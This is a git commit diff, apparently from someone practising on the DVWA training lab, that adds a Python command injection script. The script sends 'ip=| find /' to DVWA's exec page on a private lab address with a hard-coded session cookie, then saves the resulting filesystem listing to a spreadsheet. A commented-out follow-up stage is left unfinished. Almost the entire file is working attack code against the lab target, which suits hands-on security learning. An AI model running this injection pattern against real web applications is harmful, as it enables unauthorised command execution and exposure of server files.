63356cc5cfad7e0715bf102c469ed36586305219
이준형 <miki3079@naver.com>
2023-08-25 16:56:04 +0900

    add dvwa attack code

--- Cralwer/client.py
+++ Cralwer/client.py
@@ -1,18 +1,78 @@
 import requests
 from bs4 import BeautifulSoup
+from openpyxl import Workbook
 
-url = "http://192.168.84.131/dvwa/vulnerabilities/exec/"
-headers = {
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Cookie": "security=low; PHPSESSID=578aa57998b5d450439a63f1f749c406"
-}
-data = "ip=%7C+ls+-al+/&submit=submit"
+PHPSESSID = "7abc41a063ff99c69a837a07352022fe"
+
+def command_injection():
+    url = "http://192.168.84.131/dvwa/vulnerabilities/exec/"
+    headers = {
+        "Cache-Control" : "max-age=0",
+        "Origin": "http://192.168.84.131",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Referer": "http://192.168.84.131/dvwa/vulnerabilities/exec/",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Cookie": f'security=low; PHPSESSID={PHPSESSID}',
+    }
+    data_front = "ip=%7C+"
+    payload_file = "find+%2F"
+    payload_directory = "find+%2F"
+    data_back = "&submit=submit"
+
+    print("first")
+    response = requests.post(url,data=data_front+payload_file+data_back, headers=headers)
+    soup = BeautifulSoup(response.content, "html.parser")
+    try:
+        result = str(soup.find("pre").contents)[:-4]
+    except:
+        print("soup.find error")
+        print(response.text)
+        exit()
+
+    result = result.split('\\n')
+
+    write_wb = Workbook()
+    write_ws = write_wb.create_sheet('Files')
+    write_ws = write_wb.active
 
 
-response = requests.post(url,data=data, headers=headers, verify=False)
-soup = BeautifulSoup(response.content, "html.parser")
-links = []
+    for idx, res in enumerate(result):
+        if(idx == 0):
+                 continue
+        print(res)
+        write_ws.cell(idx+1, 1, res)
+    
+    write_wb.save("files.xlsx")
 
-result = soup.find_all("pre")
-print(result)
+    # print("second")
+    # response = requests.post(url,data=data_front+payload_file+data_back, headers=headers)
+    # soup = BeautifulSoup(response.content, "html.parser")
+    # try:
+    #     result = str(soup.find("pre").contents)[:-4]
+    # except:
+    #     print("soup.find error")
+    #     exit()
 
+    # result = result.split('\\n')
+    # for idx, res in enumerate(result):
+    #     if(idx == 0):
+    #              continue
+    #     res_temp = res.split("/")
+    #     res_temp = res_temp[0:-1]
+    #     res_temp = '/'.join(res)
+    #     if(res_temp in result):
+             
+    #     print(res)
+    #    break
+
+    
+
+    
+
+
+
+if __name__=="__main__":
+    command_injection()
